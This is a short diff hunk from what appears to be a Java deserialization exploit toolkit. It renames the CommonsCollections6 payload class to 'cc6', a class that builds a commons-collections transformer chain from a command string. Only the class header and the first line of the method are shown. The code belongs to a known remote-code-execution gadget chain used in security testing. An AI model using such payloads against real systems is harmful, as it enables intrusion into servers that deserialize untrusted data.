@@ -35,7 +35,7 @@ import java.util.Map;
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.MATTHIASKAISER})
-public class CommonsCollections6 implements ObjectPayload<Serializable> {
+public class cc6 implements ObjectPayload<Serializable> {
     public Serializable getObject(String command) throws Exception {
 
         final Transformer[] transformers = TransformerUtil.makeTransformer(command);
